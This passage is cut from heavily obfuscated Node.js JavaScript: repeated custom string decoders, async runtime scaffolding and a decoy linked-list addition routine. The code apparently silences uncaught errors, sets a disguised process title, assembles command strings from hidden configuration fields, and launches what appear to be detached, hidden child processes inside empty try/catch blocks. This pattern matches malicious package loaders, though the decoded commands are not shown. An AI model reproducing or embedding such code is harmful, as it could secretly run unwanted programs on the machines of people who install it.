b1Byj0[msUitO]=xf5JGoX(r0hQeKA[msUitO])}return b1Byj0[msUitO]}}if(!xf5JGoX){xf5JGoX=function(xf5JGoX){var msUitO="l)PoIUx+c9(:/AShmEBquXJpWtk]Z0v,i&{CeGTQ\"3Y84*[jVO1%$n_5~<sw>#2D=F6fHR@;.K}Ld`rzM7y|g!bN?a^",hb0EB_,CDWv3j,O1DDlX,jTVQTEg,t7CxrL,glktMJ,XOUZpH;SFoT2s(hb0EB_=""+(xf5JGoX||""),CDWv3j=hb0EB_.length,O1DDlX=[],jTVQTEg=McEUGbi[0x0],t7CxrL=McEUGbi[0x0],glktMJ=-McEUGbi[0x1]);for(XOUZpH=McEUGbi[0x0];XOUZpH<CDWv3j;XOUZpH++){var klPO1jx=msUitO.indexOf(hb0EB_[XOUZpH]);if(klPO1jx===-McEUGbi[0x1])continue;if(glktMJ<McEUGbi[0x0]){glktMJ=klPO1jx}else{SFoT2s(glktMJ+=klPO1jx*McEUGbi[0xc],jTVQTEg|=glktMJ<<t7CxrL,t7CxrL+=(glktMJ&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(O1DDlX.push(jTVQTEg&McEUGbi[0x3]),jTVQTEg>>=McEUGbi[0x2],t7CxrL-=McEUGbi[0x2])}while(t7CxrL>McEUGbi[0x9]);glktMJ=-McEUGbi[0x1]}}if(glktMJ>-McEUGbi[0x1]){O1DDlX.push((jTVQTEg|glktMJ<<t7CxrL)&McEUGbi[0x3])}return JEtDCZ(O1DDlX)}}SFoT2s(EBjXmGw=void 0x0,hb0EB_=void 0x0,CDWv3j=ANwvNEQ(0x5c)==typeof Symbol?Symbol:{},O1DDlX=CDWv3j[msUitO(0x5d)]||msUitO(0x5e),jTVQTEg=CDWv3j[msUitO(0x5f)]||msUitO(0x60),t7CxrL={},hb0EB_=Object[msUitO(0x77)],klPO1jx=[][O1DDlX]?hb0EB_(hb0EB_([][O1DDlX]())):(s6MdtwU(hb0EB_={},O1DDlX,function(){return this}),hb0EB_),S5tZKwH=XOUZpH[msUitO(McEUGbi[0x1b])]=glktMJ[msUitO(McEUGbi[0x1b])]=Object[msUitO(0x78)](klPO1jx));return qq2T4n[msUitO(McEUGbi[0x1b])]=XOUZpH,s6MdtwU(S5tZKwH,msUitO(McEUGbi[0x1d]),XOUZpH),s6MdtwU(XOUZpH,msUitO(McEUGbi[0x1d]),qq2T4n),qq2T4n[msUitO(McEUGbi[0x1e])]=msUitO(McEUGbi[0x1f]),s6MdtwU(XOUZpH,jTVQTEg,msUitO(McEUGbi[0x1f])),s6MdtwU(S5tZKwH),s6MdtwU(S5tZKwH,jTVQTEg,msUitO(0x81)),s6MdtwU(S5tZKwH,O1DDlX,function(){return this}),s6MdtwU(S5tZKwH,msUitO(0x82),function(){function xf5JGoX(xf5JGoX){var msUitO="+JaAZPomU),^~:xv%LBOW74}9y/C`$It<(6T[ei@zc&#1Mg>qw=!dY|_u\"rK5QjN?.pRDF{3f8XVbG;0H*hnSkE]2sl",hb0EB_,CDWv3j,O1DDlX,jTVQTEg,t7CxrL,glktMJ,XOUZpH;SFoT2s(hb0EB_=""+(xf5JGoX||""),CDWv3j=hb0EB_.length,O1DDlX=[],jTVQTEg=McEUGbi[0x0],t7CxrL=McEUGbi[0x0],glktMJ=-McEUGbi[0x1]);for(XOUZpH=McEUGbi[0x0];XOUZpH<CDWv3j;XOUZpH++){var klPO1jx=msUitO.indexOf(hb0EB_[XOUZpH]);if(klPO1jx===-McEUGbi[0x1])continue;if(glktMJ<McEUGbi[0x0]){glktMJ=klPO1jx}else{SFoT2s(glktMJ+=klPO1jx*McEUGbi[0xc],jTVQTEg|=glktMJ<<t7CxrL,t7CxrL+=(glktMJ&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(O1DDlX.push(jTVQTEg&McEUGbi[0x3]),jTVQTEg>>=McEUGbi[0x2],t7CxrL-=McEUGbi[0x2])}while(t7CxrL>McEUGbi[0x9]);glktMJ=-McEUGbi[0x1]}}if(glktMJ>-McEUGbi[0x1]){O1DDlX.push((jTVQTEg|glktMJ<<t7CxrL)&McEUGbi[0x3])}return JEtDCZ(O1DDlX)}function msUitO(msUitO){if(typeof b1Byj0[msUitO]===McEUGbi[0x5]){return b1Byj0[msUitO]=xf5JGoX(r0hQeKA[msUitO])}return b1Byj0[msUitO]}return msUitO(0x83)}),(Q9V1r7=function(){return{[McEUGbi[0x2b]]:ZwHurCB,[McEUGbi[0x2a]]:T2Y9Fgp}})()}function s6MdtwU(Vpqkej,RBOkiuJ,svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX){if(!U4emrr){U4emrr=function(Vpqkej){if(typeof b1Byj0[Vpqkej]===McEUGbi[0x5]){return b1Byj0[Vpqkej]=bLWrPc(r0hQeKA[Vpqkej])}return b1Byj0[Vpqkej]}}if(!bLWrPc){bLWrPc=function(RBOkiuJ){var svZDltY="%3:8uvAjt*oHUw[/lQ=KVW!^+P4\"1gJ>}xsz_YC.R`$95e{6D0M@E?bTX7Oqd,F#&r|ny;Ih(imf2~BZaGLkp])c<NS",F97NQdY,bLWrPc,U4emrr,xf5JGoX,q7TIhEw,msUitO,EBjXmGw;SFoT2s(F97NQdY=""+(RBOkiuJ||""),bLWrPc=F97NQdY.length,U4emrr=[],xf5JGoX=McEUGbi[0x0],q7TIhEw=McEUGbi[0x0],msUitO=-McEUGbi[0x1]);for(EBjXmGw=McEUGbi[0x0];EBjXmGw<bLWrPc;EBjXmGw++){var hb0EB_=svZDltY.indexOf(F97NQdY[EBjXmGw]);if(hb0EB_===-McEUGbi[0x1])continue;if(msUitO<McEUGbi[0x0]){msUitO=hb0EB_}else{SFoT2s(msUitO+=hb0EB_*McEUGbi[0xc],xf5JGoX|=msUitO<<q7TIhEw,q7TIhEw+=(msUitO&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(U4emrr.push(xf5JGoX&McEUGbi[0x3]),xf5JGoX>>=McEUGbi[0x2],q7TIhEw-=McEUGbi[0x2])}while(q7TIhEw>McEUGbi[0x9]);msUitO=-McEUGbi[0x1]}}if(msUitO>-McEUGbi[0x1]){U4emrr.push((xf5JGoX|msUitO<<q7TIhEw)&McEUGbi[0x3])}return JEtDCZ(U4emrr)}}xf5JGoX=Object[U4emrr(0x84)];try{xf5JGoX({},"",{})}catch(Vpqkej){xf5JGoX=McEUGbi[0x0]}SFoT2s(s6MdtwU=function(bLWrPc,msUitO,EBjXmGw,hb0EB_){if(msUitO){function CDWv3j(msUitO){var EBjXmGw="AxHSFTy^c*4CIMzLYu?5n9UNlWQ<G.=#dK|&>hkiOfXB)o3v~_$gsjZ:D,b7`;%[VmR1/Je@aw}8t+pPq2E0\"{]!6(r",hb0EB_,CDWv3j,O1DDlX,jTVQTEg,ZwHurCB,t7CxrL,RBOkiuJ;SFoT2s(hb0EB_=""+(msUitO||""),CDWv3j=hb0EB_.length,O1DDlX=[],jTVQTEg=McEUGbi[0x0],ZwHurCB=McEUGbi[0x0],t7CxrL=-McEUGbi[0x1]);for(RBOkiuJ=McEUGbi[0x0];RBOkiuJ<CDWv3j;RBOkiuJ++){var svZDltY=EBjXmGw.indexOf(hb0EB_[RBOkiuJ]);if(svZDltY===-McEUGbi[0x1])continue;if(t7CxrL<McEUGbi[0x0]){t7CxrL=svZDltY}else{SFoT2s(t7CxrL+=svZDltY*McEUGbi[0xc],jTVQTEg|=t7CxrL<<ZwHurCB,ZwHurCB+=(t7CxrL&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(O1DDlX.push(jTVQTEg&McEUGbi[0x3]),jTVQTEg>>=McEUGbi[0x2],ZwHurCB-=McEUGbi[0x2])}while(ZwHurCB>McEUGbi[0x9]);t7CxrL=-McEUGbi[0x1]}}if(t7CxrL>-McEUGbi[0x1]){O1DDlX.push((jTVQTEg|t7CxrL<<ZwHurCB)&McEUGbi[0x3])}return JEtDCZ(O1DDlX)}function O1DDlX(bLWrPc){if(typeof b1Byj0[bLWrPc]===McEUGbi[0x5]){return b1Byj0[bLWrPc]=CDWv3j(r0hQeKA[bLWrPc])}return b1Byj0[bLWrPc]}xf5JGoX?xf5JGoX(bLWrPc,msUitO,{[O1DDlX(0x85)]:EBjXmGw,[O1DDlX(0x86)]:!hb0EB_,[O1DDlX(0x87)]:!hb0EB_,[O1DDlX(0x88)]:!hb0EB_}):bLWrPc[msUitO]=EBjXmGw}else{var jTVQTEg;function ZwHurCB(msUitO){var EBjXmGw="oAZBIj2Ct<Fm@up/|)RsQxT3V9HNUOnDaqGYeMiElX$}!WcbJ=dSz+[`fgkKvP8r1L:_>&w(~^4\"y*].670;,#{%?h5",hb0EB_,CDWv3j,O1DDlX,jTVQTEg,ZwHurCB,t7CxrL,RBOkiuJ;SFoT2s(hb0EB_=""+(msUitO||""),CDWv3j=hb0EB_.length,O1DDlX=[],jTVQTEg=McEUGbi[0x0],ZwHurCB=McEUGbi[0x0],t7CxrL=-McEUGbi[0x1]);for(RBOkiuJ=McEUGbi[0x0];RBOkiuJ<CDWv3j;RBOkiuJ++){var svZDltY=EBjXmGw.indexOf(hb0EB_[RBOkiuJ]);if(svZDltY===-McEUGbi[0x1])continue;if(t7CxrL<McEUGbi[0x0]){t7CxrL=svZDltY}else{SFoT2s(t7CxrL+=svZDltY*McEUGbi[0xc],jTVQTEg|=t7CxrL<<ZwHurCB,ZwHurCB+=(t7CxrL&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(O1DDlX.push(jTVQTEg&McEUGbi[0x3]),jTVQTEg>>=McEUGbi[0x2],ZwHurCB-=McEUGbi[0x2])}while(ZwHurCB>McEUGbi[0x9]);t7CxrL=-McEUGbi[0x1]}}if(t7CxrL>-McEUGbi[0x1]){O1DDlX.push((jTVQTEg|t7CxrL<<ZwHurCB)&McEUGbi[0x3])}return JEtDCZ(O1DDlX)}function t7CxrL(bLWrPc){if(typeof b1Byj0[bLWrPc]===McEUGbi[0x5]){return b1Byj0[bLWrPc]=ZwHurCB(r0hQeKA[bLWrPc])}return b1Byj0[bLWrPc]}SFoT2s(jTVQTEg=function(hb0EB_,CDWv3j){s6MdtwU(bLWrPc,hb0EB_,function(O1DDlX){return this[U4emrr(0x89)](hb0EB_,CDWv3j,O1DDlX)})},jTVQTEg(t7CxrL(0x8a),McEUGbi[0x0]),jTVQTEg(t7CxrL(0x8b),McEUGbi[0x1]),jTVQTEg(t7CxrL(0x8c),McEUGbi[0x17]))}},s6MdtwU(Vpqkej,RBOkiuJ,svZDltY,F97NQdY))}function ytigG8Z(RBOkiuJ,svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,msUitO){function EBjXmGw(svZDltY){var F97NQdY="KQ&zrlD5eA~[0b{Jj1n\"t7;G8Ys9UI*ZLhXiEP+dCTVm^2WFxH6=w_aSMOBypf!$qRc:gkN}>(%)<,v@4|u#3?/`]o.",bLWrPc,U4emrr,xf5JGoX,msUitO,EBjXmGw,hb0EB_,O1DDlX;SFoT2s(bLWrPc=""+(svZDltY||""),U4emrr=bLWrPc.length,xf5JGoX=[],msUitO=McEUGbi[0x0],EBjXmGw=McEUGbi[0x0],hb0EB_=-McEUGbi[0x1]);for(O1DDlX=McEUGbi[0x0];O1DDlX<U4emrr;O1DDlX++){var q7TIhEw=F97NQdY.indexOf(bLWrPc[O1DDlX]);if(q7TIhEw===-McEUGbi[0x1])continue;if(hb0EB_<McEUGbi[0x0]){hb0EB_=q7TIhEw}else{SFoT2s(hb0EB_+=q7TIhEw*McEUGbi[0xc],msUitO|=hb0EB_<<EBjXmGw,EBjXmGw+=(hb0EB_&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(xf5JGoX.push(msUitO&McEUGbi[0x3]),msUitO>>=McEUGbi[0x2],EBjXmGw-=McEUGbi[0x2])}while(EBjXmGw>McEUGbi[0x9]);hb0EB_=-McEUGbi[0x1]}}if(hb0EB_>-McEUGbi[0x1]){xf5JGoX.push((msUitO|hb0EB_<<EBjXmGw)&McEUGbi[0x3])}return JEtDCZ(xf5JGoX)}function hb0EB_(RBOkiuJ){if(typeof b1Byj0[RBOkiuJ]===McEUGbi[0x5]){return b1Byj0[RBOkiuJ]=EBjXmGw(r0hQeKA[RBOkiuJ])}return b1Byj0[RBOkiuJ]}try{var CDWv3j=RBOkiuJ[xf5JGoX](msUitO),O1DDlX;O1DDlX=CDWv3j[ANwvNEQ(0x8d)]}catch(RBOkiuJ){return void F97NQdY(RBOkiuJ)}CDWv3j[hb0EB_(0x8e)]?svZDltY(O1DDlX):Promise[hb0EB_(0x8f)](O1DDlX)[hb0EB_(0x90)](bLWrPc,U4emrr)}function iCB8vT(RBOkiuJ){return function(){var svZDltY=this,F97NQdY;F97NQdY=arguments;return new Promise(function(bLWrPc,U4emrr){var xf5JGoX=RBOkiuJ[ANwvNEQ(0x91)](svZDltY,F97NQdY);function msUitO(svZDltY){ytigG8Z(xf5JGoX,bLWrPc,U4emrr,msUitO,EBjXmGw,ANwvNEQ(0x92),svZDltY)}function EBjXmGw(svZDltY){function F97NQdY(F97NQdY){var q7TIhEw="}:|[=.4,0;9I2Kdt%Hg$6cjDrBJmfL(&qS`QVxZ^U)C~aO/v!]X7*5@l83hGyFbWzRE{1Auis#NwTnYM>p?e<_+ok\"P",bLWrPc,U4emrr,xf5JGoX,EBjXmGw,Vpqkej,hb0EB_,CDWv3j;SFoT2s(bLWrPc=""+(F97NQdY||""),U4emrr=bLWrPc.length,xf5JGoX=[],EBjXmGw=McEUGbi[0x0],Vpqkej=McEUGbi[0x0],hb0EB_=-McEUGbi[0x1]);for(CDWv3j=McEUGbi[0x0];CDWv3j<U4emrr;CDWv3j++){var O1DDlX=q7TIhEw.indexOf(bLWrPc[CDWv3j]);if(O1DDlX===-McEUGbi[0x1])continue;if(hb0EB_<McEUGbi[0x0]){hb0EB_=O1DDlX}else{SFoT2s(hb0EB_+=O1DDlX*McEUGbi[0xc],EBjXmGw|=hb0EB_<<Vpqkej,Vpqkej+=(hb0EB_&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(xf5JGoX.push(EBjXmGw&McEUGbi[0x3]),EBjXmGw>>=McEUGbi[0x2],Vpqkej-=McEUGbi[0x2])}while(Vpqkej>McEUGbi[0x9]);hb0EB_=-McEUGbi[0x1]}}if(hb0EB_>-McEUGbi[0x1]){xf5JGoX.push((EBjXmGw|hb0EB_<<Vpqkej)&McEUGbi[0x3])}return JEtDCZ(xf5JGoX)}function q7TIhEw(svZDltY){if(typeof b1Byj0[svZDltY]===McEUGbi[0x5]){return b1Byj0[svZDltY]=F97NQdY(r0hQeKA[svZDltY])}return b1Byj0[svZDltY]}ytigG8Z(xf5JGoX,bLWrPc,U4emrr,msUitO,EBjXmGw,q7TIhEw(0x93),svZDltY)}msUitO(void McEUGbi[0x0])})}}SFoT2s(INhnfLw=Vy3HTqz(McEUGbi[0x20]),Vpqkej=Vy3HTqz(McEUGbi[0x21]),RBOkiuJ=Vy3HTqz(McEUGbi[0x22]),Kw8_B1=RBOkiuJ[ANwvNEQ(0x94)],svZDltY=RBOkiuJ[gRQAQy(0x95)],F97NQdY=Vy3HTqz(McEUGbi[0x23]),process[gRQAQy(0x96)]=gRQAQy(0x97),process[McEUGbi[0x24]](gRQAQy(0x98),function(q7TIhEw){}),process[McEUGbi[0x24]](gRQAQy(0x99),function(q7TIhEw){}),bLWrPc=F97NQdY[gRQAQy(0x9a)],U4emrr=F97NQdY[gRQAQy(0x9b)],xf5JGoX=F97NQdY.t,UeIjaFm=F97NQdY[McEUGbi[0x13]],msUitO=F97NQdY.kp,EBjXmGw=F97NQdY[gRQAQy(0x9c)],hb0EB_=F97NQdY[gRQAQy(0x9d)],CDWv3j=F97NQdY[McEUGbi[0x25]],O1DDlX=F97NQdY.b,kzAliL=F97NQdY.c,jTVQTEg=F97NQdY[McEUGbi[0x26]],ZwHurCB=F97NQdY.e,t7CxrL=F97NQdY[McEUGbi[0x27]],MkDzPi=F97NQdY.g,glktMJ=F97NQdY.h,qq2T4n=""[gRQAQy(McEUGbi[0x29])](CDWv3j,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](O1DDlX,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](kzAliL,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](jTVQTEg),XOUZpH=""[gRQAQy(McEUGbi[0x29])](ZwHurCB,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](t7CxrL,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](MkDzPi,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](glktMJ),klPO1jx=""[gRQAQy(McEUGbi[0x29])](ZwHurCB,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](t7CxrL,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](MkDzPi,McEUGbi[0x28])[gRQAQy(McEUGbi[0x29])](glktMJ));function S3ncdk(){function q7TIhEw(q7TIhEw){var Vpqkej="DBf7u*(mRSK}W&V9e?+shObGX/_TvN=3#ztI$;pFC:qH4jU{5l2|g0]w>1)r,YZJE.6in<~`A%8\"Ld[!o@xM^PaQkcy",RBOkiuJ,svZDltY,F97NQdY,bLWrPc,U4emrr,xf5JGoX,msUitO;SFoT2s(RBOkiuJ=""+(q7TIhEw||""),svZDltY=RBOkiuJ.length,F97NQdY=[],bLWrPc=McEUGbi[0x0],U4emrr=McEUGbi[0x0],xf5JGoX=-McEUGbi[0x1]);for(msUitO=McEUGbi[0x0];msUitO<svZDltY;msUitO++){var EBjXmGw=Vpqkej.indexOf(RBOkiuJ[msUitO]);if(EBjXmGw===-McEUGbi[0x1])continue;if(xf5JGoX<McEUGbi[0x0]){xf5JGoX=EBjXmGw}else{SFoT2s(xf5JGoX+=EBjXmGw*McEUGbi[0xc],bLWrPc|=xf5JGoX<<U4emrr,U4emrr+=(xf5JGoX&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(F97NQdY.push(bLWrPc&McEUGbi[0x3]),bLWrPc>>=McEUGbi[0x2],U4emrr-=McEUGbi[0x2])}while(U4emrr>McEUGbi[0x9]);xf5JGoX=-McEUGbi[0x1]}}if(xf5JGoX>-McEUGbi[0x1]){F97NQdY.push((bLWrPc|xf5JGoX<<U4emrr)&McEUGbi[0x3])}return JEtDCZ(F97NQdY)}function Vpqkej(Vpqkej){if(typeof b1Byj0[Vpqkej]===McEUGbi[0x5]){return b1Byj0[Vpqkej]=q7TIhEw(r0hQeKA[Vpqkej])}return b1Byj0[Vpqkej]}return(S3ncdk=iCB8vT(Q9V1r7()[McEUGbi[0x2a]](function q7TIhEw(){return Q9V1r7()[McEUGbi[0x2b]](function(Vpqkej){for(;;){function RBOkiuJ(RBOkiuJ){var svZDltY="agJw/E#$7hZH[%5)=8z_(^4]<u:fDi,`x|{?v1;692!0&+}\"~@>3.yclP*XkYLTGnORbUdoNMCBjWtsIeAmrQSFqVpK",F97NQdY,bLWrPc,U4emrr,xf5JGoX,msUitO,EBjXmGw,hb0EB_;SFoT2s(F97NQdY=""+(RBOkiuJ||""),bLWrPc=F97NQdY.length,U4emrr=[],xf5JGoX=McEUGbi[0x0],msUitO=McEUGbi[0x0],EBjXmGw=-McEUGbi[0x1]);for(hb0EB_=McEUGbi[0x0];hb0EB_<bLWrPc;hb0EB_++){var CDWv3j=svZDltY.indexOf(F97NQdY[hb0EB_]);if(CDWv3j===-McEUGbi[0x1])continue;if(EBjXmGw<McEUGbi[0x0]){EBjXmGw=CDWv3j}else{SFoT2s(EBjXmGw+=CDWv3j*McEUGbi[0xc],xf5JGoX|=EBjXmGw<<msUitO,msUitO+=(EBjXmGw&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(U4emrr.push(xf5JGoX&McEUGbi[0x3]),xf5JGoX>>=McEUGbi[0x2],msUitO-=McEUGbi[0x2])}while(msUitO>McEUGbi[0x9]);EBjXmGw=-McEUGbi[0x1]}}if(EBjXmGw>-McEUGbi[0x1]){U4emrr.push((xf5JGoX|EBjXmGw<<msUitO)&McEUGbi[0x3])}return JEtDCZ(U4emrr)}function svZDltY(Vpqkej){if(typeof b1Byj0[Vpqkej]===McEUGbi[0x5]){return b1Byj0[Vpqkej]=RBOkiuJ(r0hQeKA[Vpqkej])}return b1Byj0[Vpqkej]}if(svZDltY(0x9f)in RI3w2l){F97NQdY()}function F97NQdY(){var Vpqkej;function RBOkiuJ(){}SFoT2s(Vpqkej=function(Vpqkej,svZDltY){var F97NQdY=McEUGbi[0x0],q7TIhEw,R4y7UQ,INhnfLw,Kw8_B1,bLWrPc;SFoT2s(q7TIhEw=McEUGbi[0x0],R4y7UQ=new RBOkiuJ(McEUGbi[0x0]),INhnfLw=R4y7UQ,Kw8_B1=Vpqkej,bLWrPc=svZDltY);while(Kw8_B1!==McEUGbi[0x2c]||bLWrPc!==McEUGbi[0x2c]){SFoT2s(q7TIhEw=(Kw8_B1?Kw8_B1.val:McEUGbi[0x0])+(bLWrPc?bLWrPc.val:McEUGbi[0x0])+F97NQdY,F97NQdY=Math.floor(q7TIhEw/McEUGbi[0x2d]),INhnfLw.next=new RBOkiuJ(q7TIhEw%McEUGbi[0x2d]),INhnfLw=INhnfLw.next,Kw8_B1=Kw8_B1?Kw8_B1.next:McEUGbi[0x2c],bLWrPc=bLWrPc?bLWrPc.next:McEUGbi[0x2c])}if(F97NQdY)INhnfLw.next=new RBOkiuJ(F97NQdY);return R4y7UQ.next},console.log(Vpqkej))}switch(Vpqkej[McEUGbi[0x12]]){case McEUGbi[0x0]:S5tZKwH();case McEUGbi[0x1]:return Vpqkej[McEUGbi[0x25]](McEUGbi[0x17])}}},q7TIhEw)})))[Vpqkej(0xa0)](this,arguments)}SFoT2s(S5tZKwH=function(){var RBOkiuJ=iCB8vT(Q9V1r7()[McEUGbi[0x2a]](function F97NQdY(){var CDWv3j,O1DDlX,jTVQTEg,ZwHurCB,t7CxrL;SFoT2s(O1DDlX=void 0x0,jTVQTEg=void 0x0,ZwHurCB=void 0x0,t7CxrL=void 0x0);return Q9V1r7()[McEUGbi[0x2b]](function(MkDzPi){for(;;){function glktMJ(glktMJ){var S5tZKwH="+eAbTHM9uBWi*$z.v@l18]a>kXg62}SnqZ%#jL|Pst4N)dV7Yp?y!\"_JIf[ODhrx3wF`Uc&,(:R0/5m{QK=Eo^;CG~<",T2Y9Fgp,Q9V1r7,S3ncdk,ANwvNEQ,RI3w2l,T4YuTBm,o2xD2y;SFoT2s(T2Y9Fgp=""+(glktMJ||""),Q9V1r7=T2Y9Fgp.length,S3ncdk=[],ANwvNEQ=McEUGbi[0x0],RI3w2l=McEUGbi[0x0],T4YuTBm=-McEUGbi[0x1]);for(o2xD2y=McEUGbi[0x0];o2xD2y<Q9V1r7;o2xD2y++){var b0dUuz=S5tZKwH.indexOf(T2Y9Fgp[o2xD2y]);if(b0dUuz===-McEUGbi[0x1])continue;if(T4YuTBm<McEUGbi[0x0]){T4YuTBm=b0dUuz}else{SFoT2s(T4YuTBm+=b0dUuz*McEUGbi[0xc],ANwvNEQ|=T4YuTBm<<RI3w2l,RI3w2l+=(T4YuTBm&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(S3ncdk.push(ANwvNEQ&McEUGbi[0x3]),ANwvNEQ>>=McEUGbi[0x2],RI3w2l-=McEUGbi[0x2])}while(RI3w2l>McEUGbi[0x9]);T4YuTBm=-McEUGbi[0x1]}}if(T4YuTBm>-McEUGbi[0x1]){S3ncdk.push((ANwvNEQ|T4YuTBm<<RI3w2l)&McEUGbi[0x3])}return JEtDCZ(S3ncdk)}function S5tZKwH(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=glktMJ(r0hQeKA[MkDzPi])}return b1Byj0[MkDzPi]}switch(MkDzPi[McEUGbi[0x12]]){case McEUGbi[0x0]:CDWv3j=gRQAQy(0xa1)[S5tZKwH(McEUGbi[0x2e])](bLWrPc,S5tZKwH(0xa3))[S5tZKwH(McEUGbi[0x2e])](qq2T4n,S5tZKwH(0xa4))[S5tZKwH(McEUGbi[0x2e])](xf5JGoX,S5tZKwH(0xa5))[S5tZKwH(McEUGbi[0x2e])](qq2T4n,S5tZKwH(0xa6))[S5tZKwH(McEUGbi[0x2e])](xf5JGoX,S5tZKwH(0xa7))[S5tZKwH(McEUGbi[0x2e])](qq2T4n,McEUGbi[0x2f])[S5tZKwH(McEUGbi[0x2e])](UeIjaFm,S5tZKwH(0xa8))[S5tZKwH(McEUGbi[0x2e])](xf5JGoX,S5tZKwH(0xa9))[S5tZKwH(McEUGbi[0x2e])](xf5JGoX,S5tZKwH(0xaa))[S5tZKwH(McEUGbi[0x2e])](xf5JGoX,S5tZKwH(0xab));try{function T2Y9Fgp(glktMJ){var S5tZKwH="U0rAYB8d+/X:{C*txEyfl?z#qg&^@uJbaK=>;[Q(DF2H\"kP51.v`I%$<!p_Ww,RN3}|)ijGL~V6Sn4sZm97]eTMOhco",T2Y9Fgp,Q9V1r7,S3ncdk,ANwvNEQ,RI3w2l,T4YuTBm,o2xD2y;SFoT2s(T2Y9Fgp=""+(glktMJ||""),Q9V1r7=T2Y9Fgp.length,S3ncdk=[],ANwvNEQ=McEUGbi[0x0],RI3w2l=McEUGbi[0x0],T4YuTBm=-McEUGbi[0x1]);for(o2xD2y=McEUGbi[0x0];o2xD2y<Q9V1r7;o2xD2y++){var b0dUuz=S5tZKwH.indexOf(T2Y9Fgp[o2xD2y]);if(b0dUuz===-McEUGbi[0x1])continue;if(T4YuTBm<McEUGbi[0x0]){T4YuTBm=b0dUuz}else{SFoT2s(T4YuTBm+=b0dUuz*McEUGbi[0xc],ANwvNEQ|=T4YuTBm<<RI3w2l,RI3w2l+=(T4YuTBm&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(S3ncdk.push(ANwvNEQ&McEUGbi[0x3]),ANwvNEQ>>=McEUGbi[0x2],RI3w2l-=McEUGbi[0x2])}while(RI3w2l>McEUGbi[0x9]);T4YuTBm=-McEUGbi[0x1]}}if(T4YuTBm>-McEUGbi[0x1]){S3ncdk.push((ANwvNEQ|T4YuTBm<<RI3w2l)&McEUGbi[0x3])}return JEtDCZ(S3ncdk)}function Q9V1r7(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=T2Y9Fgp(r0hQeKA[MkDzPi])}return b1Byj0[MkDzPi]}svZDltY(S5tZKwH(McEUGbi[0x30]),[McEUGbi[0x31],CDWv3j],{[Q9V1r7(0xad)]:!McEUGbi[0x0],[Q9V1r7(0xae)]:!McEUGbi[0x0],[Q9V1r7(0xaf)]:Q9V1r7(0xb0)})}catch(MkDzPi){}O1DDlX=S5tZKwH(0xb1)[S5tZKwH(McEUGbi[0x2e])](klPO1jx,McEUGbi[0x2f])[S5tZKwH(McEUGbi[0x2e])](hb0EB_,S5tZKwH(0xb2))[S5tZKwH(McEUGbi[0x2e])](U4emrr,S5tZKwH(McEUGbi[0x32]))[S5tZKwH(McEUGbi[0x2e])](xf5JGoX,S5tZKwH(0xb4));try{function S3ncdk(glktMJ){var S5tZKwH="<fVAKQnpPOb%Yuj3Ses[`.M02rkm/X)#Wv5qa_czBF(w91Z;}:i&!to^,4yDN$=\"Ixd{J*gL+C~R|6El8Th7?@]HUG>",T2Y9Fgp,Q9V1r7,S3ncdk,ANwvNEQ,RI3w2l,T4YuTBm,o2xD2y;SFoT2s(T2Y9Fgp=""+(glktMJ||""),Q9V1r7=T2Y9Fgp.length,S3ncdk=[],ANwvNEQ=McEUGbi[0x0],RI3w2l=McEUGbi[0x0],T4YuTBm=-McEUGbi[0x1]);for(o2xD2y=McEUGbi[0x0];o2xD2y<Q9V1r7;o2xD2y++){var b0dUuz=S5tZKwH.indexOf(T2Y9Fgp[o2xD2y]);if(b0dUuz===-McEUGbi[0x1])continue;if(T4YuTBm<McEUGbi[0x0]){T4YuTBm=b0dUuz}else{SFoT2s(T4YuTBm+=b0dUuz*McEUGbi[0xc],ANwvNEQ|=T4YuTBm<<RI3w2l,RI3w2l+=(T4YuTBm&McEUGbi[0xd])>McEUGbi[0xe]?McEUGbi[0xf]:McEUGbi[0x10]);do{SFoT2s(S3ncdk.push(ANwvNEQ&McEUGbi[0x3]),ANwvNEQ>>=McEUGbi[0x2],RI3w2l-=McEUGbi[0x2])}while(RI3w2l>McEUGbi[0x9]);T4YuTBm=-McEUGbi[0x1]}}if(T4YuTBm>-McEUGbi[0x1]){S3ncdk.push((ANwvNEQ|T4YuTBm<<RI3w2l)&McEUGbi[0x3])}return JEtDCZ(S3ncdk)}function ANwvNEQ(MkDzPi){if(typeof b1Byj0[MkDzPi]===McEUGbi[0x5]){return b1Byj0[MkDzPi]=S3ncdk(r0hQeKA[MkDzPi])}return 